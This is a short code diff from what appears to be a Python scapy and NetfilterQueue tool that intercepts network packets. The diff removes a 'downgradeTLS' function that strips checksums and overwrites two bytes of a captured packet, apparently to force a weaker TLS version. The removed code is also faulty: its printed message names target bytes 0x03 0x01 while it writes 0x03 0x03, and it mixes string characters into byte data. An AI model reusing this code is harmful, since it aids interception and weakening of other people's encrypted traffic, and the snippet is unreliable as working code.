@@ -92,23 +92,6 @@ def craftTLS(scapy_packet):
 
 
 
-def downgradeTLS(scapy_packet):
-  del scapy_packet["IP"].chksum
-  del scapy_packet["TCP"].chksum
-
-  rawBytes = [b for b in scapy_packet]
-  print("Position [61][62] was: ", rawBytes[61], rawBytes[62], ". Needs to change to 0x03 0x01.")
-
-  rawBytes[61] = '\x03'
-  rawBytes[62] = '\x03'
-
-  print("Position [61][62] is now: ", rawBytes[61], rawBytes[62], ".")
-  
-  scapy_packet = b''.join(rawBytes)
-  return scapy_packet
-
-
-
 print("Binding to NFQUEUE", nfQueueID)
 nfqueue = NetfilterQueue()
 nfqueue.bind(nfQueueID, processPacket, maxPacketsToStore)
